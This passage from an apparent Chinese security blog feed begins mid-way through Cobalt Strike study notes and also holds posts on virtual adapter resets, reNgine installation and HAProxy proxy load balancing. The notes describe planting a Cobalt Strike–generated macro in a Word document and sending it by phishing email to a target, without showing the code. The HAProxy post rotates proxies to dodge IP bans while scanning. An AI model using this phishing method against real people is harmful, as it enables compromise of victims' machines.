上的 <code>Copy Macro</code> 按钮</p><p>8、将刚复制 Cobalt Strike 生成的内容粘贴到打开的编辑器中</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-4.png"></p><p>9、关闭编辑器</p><p>10、将文档保存为启用宏的文档，这里可以选择保存为 <code>启用宏的 Word 文档</code> 或者 <code>Word 97-2003 文档</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-5.png"></p><p>接下来使用钓鱼邮件等方式上传到靶机，当靶机运行该文档后启用宏内容即可上线。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-6.png"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-7.png"></p><blockquote><p>这里不得不吐槽一句，Microsoft Office 的东西安装是真的麻烦。</p></blockquote><p>在上面 2-8 步骤创建编辑宏内容的过程，也可以打开 <code>开发工具 --&gt; Visual Basic</code> 界面，这里推荐使用快捷键<code>Alt+F11</code>打开该界面。</p><p>之后编辑<code>ThisDocument</code> 模块，粘贴宏代码也可以达到上述 2-8 步的效果。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs28-8.png"></p><h1 id="0x10-总结"><a href="#0x10-总结" class="headerlink" title="0x10 总结"></a>0x10 总结</h1><p>自 4 月 19 日发布 Cobalt Strike 第一节笔记开始，已经过去了半年的时间，踩过了无数坑，解决了无数的坑。</p><p>感谢 Cobalt Strike 的作者 <code>Raphael Mudge</code> 的课程，感谢 UP <code>Hack 学习呀</code> 上传的中文翻译版本，感谢 <code>A-Team</code> 团队的 Cobalt Strike 4.0 中文翻译手册，感谢每篇笔记最后参考链接的作者们，感谢曾经帮助我解决所碰到问题的大佬们，谢谢你们。</p><p>最后，还有一点要注意的就是， <code>CS学习笔记</code>系列只是我个人在学习 Cobalt Strike 的过程中所做的笔记，建议不要当做教程看，因为其中我本身已经知道的知识点和感觉不重要知识点我是没有记录的。</p><p>将自己的笔记公开发出来的目的有二：一是便于自己遗忘时随时查找，这也是17年我建立这个公众号的主要目的；二是在笔记中我会记录一些坑的解决方法，如果你碰到和我一样的问题，或许我这小菜鸟写的笔记就能帮助到你。</p><blockquote><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/3975">https://xz.aliyun.com/t/3975</a></p><p><a href="https://payloads.online/tools/socat">https://payloads.online/tools/socat</a></p><p><a href="https://zhuanlan.zhihu.com/p/93718885">https://zhuanlan.zhihu.com/p/93718885</a></p><p><a href="https://www.anquanke.com/post/id/156299">https://www.anquanke.com/post/id/156299</a></p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://www.freebuf.com/sectool/173366.html">https://www.freebuf.com/sectool/173366.html</a></p><p><a href="https://my.oschina.net/u/4300698/blog/3382230">https://my.oschina.net/u/4300698/blog/3382230</a></p><p><a href="https://segmentfault.com/a/1190000019290085">https://segmentfault.com/a/1190000019290085</a></p><p><a href="https://www.cnblogs.com/cthon/p/9151467.html">https://www.cnblogs.com/cthon/p/9151467.html</a></p><p><a href="https://www.secpulse.com/archives/127186.html">https://www.secpulse.com/archives/127186.html</a></p><p><a href="https://www.freebuf.com/articles/web/231892.html">https://www.freebuf.com/articles/web/231892.html</a></p><p><a href="https://klionsec.github.io/2017/09/23/cobalt-strike/">https://klionsec.github.io/2017/09/23/cobalt-strike/</a></p><p><a href="https://www.renfei.org/blog/introduction-to-spf.html">https://www.renfei.org/blog/introduction-to-spf.html</a></p><p><a href="https://www.cnblogs.com/backlion/p/10616308.html">https://www.cnblogs.com/backlion/p/10616308.html</a></p><p><a href="https://blog.csdn.net/hnjztyx/article/details/52910478">https://blog.csdn.net/hnjztyx/article/details/52910478</a></p><p><a href="http://blog.leanote.com/post/snowming/62ec1132a2c9">http://blog.leanote.com/post/snowming/62ec1132a2c9</a></p><p><a href="https://blog.csdn.net/pipisorry/article/details/52269785">https://blog.csdn.net/pipisorry/article/details/52269785</a></p><p><a href="https://blog.csdn.net/l1028386804/article/details/86675559">https://blog.csdn.net/l1028386804/article/details/86675559</a></p><p><a href="https://www.freebuf.com/company-information/167460.html">https://www.freebuf.com/company-information/167460.html</a></p><p><a href="https://blog.csdn.net/qq_34101364/article/details/108062913">https://blog.csdn.net/qq_34101364/article/details/108062913</a></p><p><a href="https://blog.csdn.net/github_35186068/article/details/80518681">https://blog.csdn.net/github_35186068/article/details/80518681</a></p><p><a href="https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/">https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/</a></p><p><a href="https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/">https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/</a></p><p><a href="https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/">https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/</a></p><p><a href="https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/">https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/</a></p><p><a href="https://wooyun.js.org/drops/Powershell%20%E6%8F%90%E6%9D%83%E6%A1%86%E6%9E%B6-Powerup.html">https://wooyun.js.org/drops/Powershell%20%E6%8F%90%E6%9D%83%E6%A1%86%E6%9E%B6-Powerup.html</a></p><p><a href="https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview">https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview</a></p><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;自2020年4月份至2020年10月份，笔者更新了自己在学习 Cobalt Strike 过程中的 </summary>
      
    
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Cobalt Strike" scheme="https://www.teamssix.com/tags/Cobalt-Strike/"/>
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
  </entry>
  
  <entry>
    <title>【经验总结】电脑休眠后虚拟网卡地址变成169.254网段的解决方法</title>
    <link href="https://www.teamssix.com/year/201015-194551.html"/>
    <id>https://www.teamssix.com/year/201015-194551.html</id>
    <published>2020-10-15T11:45:51.000Z</published>
    <updated>2020-10-15T02:00:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>一直以来会遇到一个问题，就是电脑在休眠后再次打开电脑，在使用虚拟机时网络老是会碰到问题，此时如果查看物理机上虚拟网卡的地址就会发现 IP 地址变成了 169.254.xxx.xxx 。</p><p>之所以会出现这个问题是因为 Windows 在网络不通的情况下，会自动配置一个169.254.xxx.xxx这个地址段的IP地址。</p><h1 id="0x01-常规解决方法"><a href="#0x01-常规解决方法" class="headerlink" title="0x01 常规解决方法"></a>0x01 常规解决方法</h1><p>在<code>控制面板 -&gt; 网络和 Internet -&gt; 网络共享中心</code>里找到<code>更改适配器设置</code>，然后再找到有问题的网卡，右击禁用再启用就可以了。</p><p>但是虚拟机的虚拟网卡往往会有多个，一个个禁用启用难免有些麻烦，而且整个步骤也是比较繁琐的，因此下面看一下使用批处理文件的方式。</p><h1 id="0x02-批处理文件"><a href="#0x02-批处理文件" class="headerlink" title="0x02 批处理文件"></a>0x02 批处理文件</h1><p>其实原理也很简单，直接禁用网卡再重启网卡即可，为了更加贴合使用，我在里面加入了注释、延时的功能。</p><p>将以下内容保存到本地，后缀重命名为 <code>.bat</code> 文件，双击执行就可以重启对应的网卡了。当然 bat 文件里的网卡名称要换成自己的网卡名称，比如我这里的是 <code>VMware Network Adapter VMnet1</code>等三个网卡。</p><pre><code>ipconfigrem &quot;禁用网卡 VMware Network Adapter VMnet1&quot;netsh interface set interface &quot;VMware Network Adapter VMnet1&quot; disabledrem &quot;启用网卡 VMware Network Adapter VMnet1&quot;netsh interface set interface &quot;VMware Network Adapter VMnet1&quot; enabledrem &quot;禁用网卡 VMware Network Adapter VMnet3&quot;netsh interface set interface &quot;VMware Network Adapter VMnet3&quot; disabledrem &quot;启用网卡 VMware Network Adapter VMnet3&quot;netsh interface set interface &quot;VMware Network Adapter VMnet3&quot; enabledrem &quot;禁用网卡 VMware Network Adapter VMnet7&quot;netsh interface set interface &quot;VMware Network Adapter VMnet7&quot; disabledrem &quot;启用网卡 VMware Network Adapter VMnet7&quot;netsh interface set interface &quot;VMware Network Adapter VMnet7&quot; enabledipconfigchoice /t 5 /c YN /d Y</code></pre><p>其中 <code>rem</code> 起到注释作用，<code>choice /t 5 /c YN /d Y</code> 起到延时5秒的作用，两次的 ifconfig 主要用来查看重启前后的网卡IP地址情况。</p><blockquote><p>参考链接：</p><p><a href="https://iknow.lenovo.com.cn/detail/dc_182859.html">https://iknow.lenovo.com.cn/detail/dc_182859.html</a></p><p><a href="https://blog.csdn.net/jk110333/article/details/41869053">https://blog.csdn.net/jk110333/article/details/41869053</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;一直以来会遇到一个问题，就是电脑在休眠后再次打开电脑，在使用虚拟机时网络老是会碰到问题，此时如果查看</summary>
      
    
    
    
    <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>【经验总结】关于 reNgine 自动化网络侦查框架的国内安装与报错的解决方法</title>
    <link href="https://www.teamssix.com/year/200920-142641.html"/>
    <id>https://www.teamssix.com/year/200920-142641.html</id>
    <published>2020-09-20T06:26:41.000Z</published>
    <updated>2020-10-15T02:00:22.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-关于"><a href="#0x00-关于" class="headerlink" title="0x00 关于"></a>0x00 关于</h1><p>reNgine 是 <code>Yogesh Ojha</code> 写的一款自动化网络侦查框架，或者说是信息收集聚合工具，他的推特：<a href="https://twitter.com/ojhayogesh11">@ojhayogesh11</a></p><p>该工具集合了子域名扫描、目录扫描、端口扫描、CMS扫描等等，扫描结束后，还能在手机上通知你。</p><p>在平时渗透测试的过程中使用这个工具可以节约很多信息收集的时间，项目地址为：<a href="https://github.com/yogeshojha/reNgine">https://github.com/yogeshojha/reNgine</a></p><p>在去年年底的时候我写了一款被动信息收集聚合工具，已经放在了我的 GitHub 上，当时还打算写个 Web 页面，为此还特地去学了一下 Django。</p><p>当时设计的 Web 页面大概长这个样子，但最后因为自己实在太菜，Web 页面没能写下去，只写了命令行版的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-09-11_10-09-30.png"></p><p>在今年年初又写了一款主动信息收集工具，但是效果不太理想，所以就没放在我的 GitHub 上。</p><p>直至今年7月份在逛推特的时候，偶然看到大佬分享的 reNgine 这款工具。打开这个项目一看，这不就是我理想中的信息收集聚合工具嘛，虽然目前使用起来还有不少的 bug ，但是整体上个人觉着已经很不错了，至少比自己写的不知道好了多少倍。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/86880620-92814300-c10a-11ea-9b27-627f43934221.png"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/86752434-f9482300-c05c-11ea-954b-b0f538c1ecef.png"></p><blockquote><p>在 FreeBuf 上也有其对应的中文介绍：<a href="https://www.freebuf.com/sectool/245292.html">https://www.freebuf.com/sectool/245292.html</a></p></blockquote><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><h2 id="1、环境准备"><a href="#1、环境准备" class="headerlink" title="1、环境准备"></a>1、环境准备</h2><p>需要有 docker、docker-compose、make 环境</p><h2 id="2、下载项目"><a href="#2、下载项目" class="headerlink" title="2、下载项目"></a>2、下载项目</h2><pre><code>git clone https://github.com/yogeshojha/reNgine.git</code></pre><h2 id="3、开始安装"><a href="#3、开始安装" class="headerlink" title="3、开始安装"></a>3、开始安装</h2><pre><code>cd reNginemake certs        #使用https访问，个人觉着可省略make build        #构建项目make up            #启动项目make username    #创建登陆用户</code></pre><h2 id="4、更新"><a href="#4、更新" class="headerlink" title="4、更新"></a>4、更新</h2><pre><code>git pullmake buildmake up</code></pre><p>看起来是非常的简单，但是对于在国内的我们来说，这其中包含了不少的坑。</p><h1 id="0x02-过程"><a href="#0x02-过程" class="headerlink" title="0x02 过程"></a>0x02 过程</h1><p>由于是老外写的东西，在这款工具安装过程中也引用下载了很多国外的文件，所以难免包含了一些被墙的东西。</p><p>最初在本地安装报错、安装报错这样过了几天之后就懒得整了，最后直接在国外的 vps 上去安装了，然后几分钟，真的就只要几分钟就安装好了。</p><p>但是一个月过去了、两个月过去了，随着国外 vps 的使用频率变低了，最后 vps 上最常使用的就是这个工具了，如果只是为了使用这个工具而去租个 vps ，实在觉着有些划不来。</p><p>于是又开始了在本地安装的折腾之旅，下面就来看看安装过程中的报错与解决方法。</p><h1 id="0x03-问题"><a href="#0x03-问题" class="headerlink" title="0x03 问题"></a>0x03 问题</h1><h2 id="1、下载安装很慢"><a href="#1、下载安装很慢" class="headerlink" title="1、下载安装很慢"></a>1、下载安装很慢</h2><p>一开始是以为 docker 下载慢的原因，所以试着给 docker 加代理，又或者给 docker-compose 加代理等等方法都不行。最后试了亿下后，意识到应该是 Dockers 容器里下载文件比较慢，之后修改了 reNgine 项目目录下的 Dockerfile 文件才解决了这个问题。</p><p>通过观察发现，在 build 的过程中，会访问默认系统镜像源下载安装文件，同时也会访问 pip 默认镜像源下载安装文件，因此我们只需要把这两个默认的镜像源替换成国内的就可以了。</p><p>打开 Dockerfile 文件，在第一个 <code>RUN</code> 命令前，加上以下命令。修改后，下面的命令在我这里是 Dockerfile 文件的第 13 行左右的样子。</p><pre><code>RUN sed -i &#39;s/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g&#39; /etc/apk/repositories \    &amp;&amp; mkdir ~/.pip/ \    &amp;&amp; echo &#39;[global]&#39; &gt; ~/.pip/pip.conf \    &amp;&amp; echo &#39;index-url = https://mirrors.aliyun.com/pypi/simple/&#39; &gt;&gt; ~/.pip/pip.conf</code></pre><p>上面的命令在我理解就是把 Docker 容器中的 <code>/etc/apk/repositories</code> 文件里的 <code>dl-cdn.alpinelinux.org</code> 字符串替换成了 <code>mirrors.aliyun.com</code> ，以达到将系统默认镜像源替换成阿里云镜像源的目的。</p><p>之后创建 <code>~/.pip/pip.conf</code> 文件，并添加阿里云 pip 源，以达到替换 pip 源的目的。</p><p>当然如果有不喜欢阿里云源的同学可以换成其他家的源。</p><h2 id="2、go-get-被墙"><a href="#2、go-get-被墙" class="headerlink" title="2、go get 被墙"></a>2、go get 被墙</h2><p>在默认配置下，直接使用 <code>make build</code> ，我在进行到第 12 步的时候报了下面这个错误。</p><pre><code>Step 12/24 : RUN go get -u github.com/tomnomnom/assetfinder github.com/hakluke/hakrawler github.com/haccer/subjack ---&gt; Running in e38c60f832f0package golang.org/x/net/html: unrecognized import path &quot;golang.org/x/net/html&quot; (https fetch: Get https://golang.org/x/net/html?go-get=1: dial tcp 216.239.37.1:443: connect: connection refused)package golang.org/x/net/html/charset: unrecognized import path &quot;golang.org/x/net/html/charset&quot; (https fetch: Get https://golang.org/x/net/html/charset?go-get=1: dial tcp 216.239.37.1:443: connect: connection refused)package google.golang.org/appengine/urlfetch: unrecognized import path &quot;google.golang.org/appengine/urlfetch&quot; (https fetch: Get https://google.golang.org/appengine/urlfetch?go-get=1: dial tcp 216.239.37.1:443: connect: connection refused)package golang.org/x/text/encoding: unrecognized import path &quot;golang.org/x/text/encoding&quot; (https fetch: Get https://golang.org/x/text/encoding?go-get=1: dial tcp 216.239.37.1:443: connect: connection refused)</code></pre><p>后来去网站查了亿下，是因为在使用 <code>go get</code>命令获取资源会被墙的关系。知道了原因就好办了，我们只要加代理就行了。</p><p>在 reNgine 项目目录下的 Dockerfile 文件中找到 <code># Download Go packages</code> 这一行，在这一行的下面添加以下两条命令，此时 go get 就会去走代理，访问 <code>goproxy.io</code> 这个镜像下载资源了。</p><pre><code>ENV GO111MODULE=onENV GOPROXY=https://goproxy.io</code></pre><blockquote><p>如果发现 goproxy.io 无法访问，可以试试 gocenter.io 这个代理</p></blockquote><p>再次执行 <code>make build</code> ，就会发现第 12 步成功运行，但这还没完，报错依旧继续。</p><h2 id="3、安装-psycopg2-报错"><a href="#3、安装-psycopg2-报错" class="headerlink" title="3、安装 psycopg2 报错"></a>3、安装 psycopg2 报错</h2><p>在继续安装的过程中，又给我报了这些问题</p><pre><code>Building wheel for psycopg2 (setup.py): started  Building wheel for psycopg2 (setup.py): finished with status &#39;error&#39;  ERROR: Command errored out with exit status 1:   command: /usr/local/bin/python -u -c &#39;import sys, setuptools, tokenize; sys.argv[0] = &#39;&quot;&#39;&quot;&#39;/tmp/pip-install-eps_y188/psycopg2/setup.py&#39;&quot;&#39;&quot;&#39;; __file__=&#39;&quot;&#39;&quot;&#39;/tmp/pip-install-eps_y188/psycopg2/setup.py&#39;&quot;&#39;&quot;&#39;;f=getattr(tokenize, &#39;&quot;&#39;&quot;&#39;open&#39;&quot;&#39;&quot;&#39;, open)(__file__);code=f.read().replace(&#39;&quot;&#39;&quot;&#39;\r\n&#39;&quot;&#39;&quot;&#39;, &#39;&quot;&#39;&quot;&#39;\n&#39;&quot;&#39;&quot;&#39;);f.close();exec(compile(code, __file__, &#39;&quot;&#39;&quot;&#39;exec&#39;&quot;&#39;&quot;&#39;))&#39; bdist_wheel -d /tmp/pip-wheel-fisuy49f       cwd: /tmp/pip-install-eps_y188/psycopg2/……Moving to /usr/local/lib/python3.8/site-packages/psycopg2/   from /usr/local/lib/python3.8/site-packages/~sycopg2ERROR: Command errored out with exit status 1: /usr/local/bin/python -u -c &#39;import sys, setuptools, tokenize; sys.argv[0] = &#39;&quot;&#39;&quot;&#39;/tmp/pip-install-kwlcc4ta/psycopg2/setup.py&#39;&quot;&#39;&quot;&#39;; __file__=&#39;&quot;&#39;&quot;&#39;/tmp/pip-install-kwlcc4ta/psycopg2/setup.py&#39;&quot;&#39;&quot;&#39;;f=getattr(tokenize, &#39;&quot;&#39;&quot;&#39;open&#39;&quot;&#39;&quot;&#39;, open)(__file__);code=f.read().replace(&#39;&quot;&#39;&quot;&#39;\r\n&#39;&quot;&#39;&quot;&#39;, &#39;&quot;&#39;&quot;&#39;\n&#39;&quot;&#39;&quot;&#39;);f.close();exec(compile(code, __file__, &#39;&quot;&#39;&quot;&#39;exec&#39;&quot;&#39;&quot;&#39;))&#39; install --record /tmp/pip-record-r7w9n2l8/install-record.txt --single-version-externally-managed --compile --install-headers /usr/local/include/python3.8/psycopg2 Check the logs for full command output.The command &#39;/bin/sh -c pip3 install -r /tmp/requirements.txt&#39; returned a non-zero code: 1</code></pre><p>最初判断可能是因为源的问题，但是后来发现不管是默认的源还是国内源都会报错。</p><p>然后觉着可能还是和之前两个问题一样需要修改 Dockerfile 文件，但是在修改了无数次 Dockerfile 文件后发现都不行。</p><p>直到最后判断可能是版本问题，于是把 reNgine 目录下的 requirements.txt 文件里 psycopg2 后的版本号删除，再运行果然就可以了。</p><p>如果在 <code>pip install</code> 安装其他模块也报类似的错误时，也可以尝试删除 requirements.txt 文件的里版本号试试。不过这种操作可能会给后期带来一些不兼容的问题，但总强于安都安装不上的情况。</p><blockquote><p>在 pip 安装的过程中如果报错，可以再尝试几遍，因为有时仅仅可能是因为本地网络的原因。</p></blockquote><p>如果你碰到了除上面三个问题之外的其他问题，欢迎在下方留言。</p><h1 id="0x04-最后"><a href="#0x04-最后" class="headerlink" title="0x04 最后"></a>0x04 最后</h1><p>由于国内关于这款工具的安装说明少之又少，所以只能自己一步一步的去摸索，在经历了两天的报错—》排错—》报错……之后，终于安装好了这款工具。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-09-11_12-21-28.png"></p><p>另外因为整个过程是我自己摸索出来的，因此难免中间存在有问题或者可以优化的地方，如有错误欢迎各位大佬指正。</p><blockquote><p>参考链接：</p><p><a href="https://www.liwenzhou.com/posts/Go/fix_go_get/">https://www.liwenzhou.com/posts/Go/fix_go_get/</a></p><p><a href="https://cloud.tencent.com/developer/article/1520882">https://cloud.tencent.com/developer/article/1520882</a></p><p> <a href="https://blog.csdn.net/u013360850/article/details/90602149">https://blog.csdn.net/u013360850/article/details/90602149</a></p><p> <a href="https://blog.csdn.net/xuezhangjun0121/article/details/81664260">https://blog.csdn.net/xuezhangjun0121/article/details/81664260</a></p><p> 更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-关于&quot;&gt;&lt;a href=&quot;#0x00-关于&quot; class=&quot;headerlink&quot; title=&quot;0x00 关于&quot;&gt;&lt;/a&gt;0x00 关于&lt;/h1&gt;&lt;p&gt;reNgine 是 &lt;code&gt;Yogesh Ojha&lt;/code&gt; 写的一款自动化网络侦查框架，或</summary>
      
    
    
    
    <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="工具分享" scheme="https://www.teamssix.com/tags/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    <category term="reNgine" scheme="https://www.teamssix.com/tags/reNgine/"/>
    
  </entry>
  
  <entry>
    <title>【经验总结】Linux下使用HAProxy为多个代理设置负载均衡</title>
    <link href="https://www.teamssix.com/year/200705-013156.html"/>
    <id>https://www.teamssix.com/year/200705-013156.html</id>
    <published>2020-07-04T17:31:56.000Z</published>
    <updated>2020-07-29T14:51:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在平时进行一些挖洞、扫描或者爬虫工作的时候，被封 IP 的情况时有发生，解决这个问题较好的方法可能就是挂代理了。但是代理有时也会被封，并且有的代理质量可能还不太高，这时采用负载均衡个人觉着是一种不错的解决方法。</p><p>在开启负载均衡时，系统能够自动切换到较为优质的代理线路上；同时由于系统经常自动切换 IP ，因此个人觉着也能在一定程度上减轻被封 IP 的风险。</p><a id="more"></a><p>在 Windows 上，平时个人使用的代理工具自带就有负载均衡选项，但是无奈 Linux 下个人暂时还没能找到合适的工具，后来在网上查资料得知可以通过 Nginx 或 HAProxy 去配置负载均衡，虽然这样没有 Windows 下那样方便，但好在能解决这个问题。</p><p>通过 Nginx 或 HAProxy 的对比，HAProxy 有 Web 可视化页面，因此个人觉着会更直观些，当然这个因人而异。</p><p>在折腾了一天的时间后，终于在 Linux 下利用 HAProxy 配置好了负载均衡，下面就简单记录一下配置过程以及中间踩得一些坑。</p><h1 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h1><h2 id="一些设备"><a href="#一些设备" class="headerlink" title="一些设备"></a>一些设备</h2><ul><li>一台 Linux 主机，用来做负载均衡服务器，这里以 Ubuntu 为例，其他 Linux 发行版基本上就一个安装命令与之不同。</li><li>一些可用的代理，这里以酸酸乳为例。</li></ul><h2 id="一些条件"><a href="#一些条件" class="headerlink" title="一些条件"></a>一些条件</h2><p>所有代理的密码、加密方式、协议、混淆方式都必须一致，简而言之，除了代理的IP之外的信息都尽可能的保持一致。</p><p>达到以上条件后，就可以在 Linux 下利用 HAProxy 配置负载均衡了。</p><h1 id="0x02-HAProxy-的安装与使用"><a href="#0x02-HAProxy-的安装与使用" class="headerlink" title="0x02 HAProxy 的安装与使用"></a>0x02 HAProxy 的安装与使用</h1><p>HAProxy 可直接使用<code>apt install</code>进行安装，安装之前建议先将系统<code>apt-get update</code>一下。</p><pre><code class="bash">apt install haproxy</code></pre><p>安装之后，编辑配置文件，编辑之前建议先将配置文件进行备份。</p><pre><code class="bash">mv /etc/haproxy/haproxy.cfg /etc/haproxy/haproxy.cfg.bakvim /etc/haproxy/haproxy.cfg</code></pre><p>为了便于直接复制配置文件信息，这里使用的<code>mv</code>命令进行备份，因此使用<code>vim</code>打开时，直接将以下配置文件信息根据自己情况修改复制到<code>/etc/haproxy/haproxy.cfg</code>即可。</p><pre><code class="bash">global    chroot  /var/lib/haproxy    pidfile /var/run/haproxy.pid    user    haproxy    group   haproxydefaults    mode    tcp                         #服务器默认的工作模式    balance roundrobin                  #服务器默认使用的均衡模式    retries 3                           #三次连接失败表示服务器不可用    maxconn 5000                        #最大连接数    timeout connect 500ms               #连接超时    timeout client  3s                  #客户端超时    timeout server  3s                  #服务器超时listen WebPanel    mode    http                        #这里使用HTTP模式    bind    127.0.0.1:50000             #WEB服务端口    stats   refresh 5s                  #自动刷新时间    stats   uri  /                      #WEB管理地址    stats   auth admin:admin           #账号密码    stats   hide-version                #隐藏版本    stats   admin if TRUE               #验证通过则赋予管理权listen Server    bind 127.0.0.1:8880                    #服务IP端口        server proxy_name1 proxy_ip1:proxy_port1 check inter 500 rise 2 fall 4 weight 100    #酸酸乳服务器地址与端口    server proxy_name2 proxy_ip2:proxy_port2 check inter 500 rise 2 fall 4 weight 100    #酸酸乳服务器地址与端口    server proxy_name3 proxy_ip3:proxy_port3 check inter 500 rise 2 fall 4 weight 100    #酸酸乳服务器地址与端口</code></pre><p>在上面的配置文件中，修改最后几行代理信息即可，即将其中的<code>proxy_name、proxy_ip、proxy_port</code>替换成自己的就行。</p><h2 id="关于配置文件中的一些注意事项"><a href="#关于配置文件中的一些注意事项" class="headerlink" title="关于配置文件中的一些注意事项"></a>关于配置文件中的一些注意事项</h2><ul><li>配置文件中的注释信息需要删除，尤其是中文，否则 HAProxy 启动时会报错</li><li>HAProxy 启动时如果报错，建议检查配置文件中是否存在格式错误、缺字多字的情况，这都会导致报错</li><li>如果 HAProxy 在公网服务器上建议将 Web 管理地址与登录的账号密码设置为较难猜解的信息</li><li>如果想了解配置文件中的更多信息可以查看参考链接中的文章</li></ul><p>HAProxy 配置完后，直接使用<code>service</code>命令启动即可。</p><pre><code class="bash">service haproxy start</code></pre><p>此时，浏览器打开 HAProxy 的 Web 管理地址，输入账号密码后，看到以下页面，就说明 HAProxy 已经正在运行了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-05_00-19-41.png"></p><p>在这个 Web 页面中，绿色的线路表示当前可用，红色线路表示当前可能是不可用状态，其他颜色所表示的意思可参考页面上方的示意信息。</p><h1 id="0x03-代理客户端上的配置"><a href="#0x03-代理客户端上的配置" class="headerlink" title="0x03 代理客户端上的配置"></a>0x03 代理客户端上的配置</h1><p>配置好 HAProxy，就开始配置代理工具了。根据上面 HAProxy 配置文件，服务 IP 端口配置的为<code>127.0.0.1:8880</code>。</p><p>打开酸酸乳的配置文件，我这里是<code>user-config.json</code>文件，原文件内容如下：</p><pre><code class="bash">&#123;    &quot;server&quot;:&quot;xxxxxx&quot;,    &quot;server_port&quot;:xxxx,    &quot;local_address&quot;:&quot;127.0.0.1&quot;,    &quot;local_port&quot;:1080,    &quot;password&quot;:&quot;xxxx&quot;,    &quot;timeout&quot;:600,    &quot;method&quot;:&quot;xxxx&quot;,    &quot;protocol&quot;: &quot;xxxx&quot;,    &quot;obfs&quot;: &quot;xxxx&quot;,    &quot;obfs_param&quot;: &quot;xxxx&quot;&#125;</code></pre><p>现在需要把文件中的<code>server</code>和<code>server_port</code>修改为 HAProxy 的服务 IP 端口信息，即 <code>127.0.0.1:8880</code>，修改后如下：</p><pre><code class="bash">&#123;    &quot;server&quot;:&quot;127.0.0.1&quot;,    &quot;server_port&quot;:8880,    &quot;local_address&quot;:&quot;127.0.0.1&quot;,    &quot;local_port&quot;:1080,    &quot;password&quot;:&quot;xxxx&quot;,    &quot;timeout&quot;:600,    &quot;method&quot;:&quot;xxxx&quot;,    &quot;protocol&quot;: &quot;xxxx&quot;,    &quot;obfs&quot;: &quot;xxxx&quot;,    